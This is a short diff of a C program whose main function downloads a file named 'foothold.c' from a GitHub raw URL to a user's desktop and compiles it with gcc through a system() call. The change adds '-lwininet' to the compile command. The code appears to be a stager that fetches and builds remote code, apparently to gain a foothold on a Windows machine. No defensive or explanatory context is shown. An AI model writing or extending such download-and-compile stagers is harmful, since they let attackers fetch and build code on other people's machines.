@@ -95,7 +95,7 @@ int main()
 
 	const char* filename = "c:\\Users\\saurav\\Desktop\\foothold.c";
 	URLDownloadToFile(NULL, "https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/foothold.c", filename, 0, NULL);
-	system("cmd.exe /c gcc c:\\Users\\saurav\\desktop\\foothold.c -o c:\\Users\\saurav\\desktop\\foothold.exe");
+	system("cmd.exe /c gcc c:\\Users\\saurav\\desktop\\foothold.c -o c:\\Users\\saurav\\desktop\\foothold.exe -lwininet");
 	
 	return 0;
 	
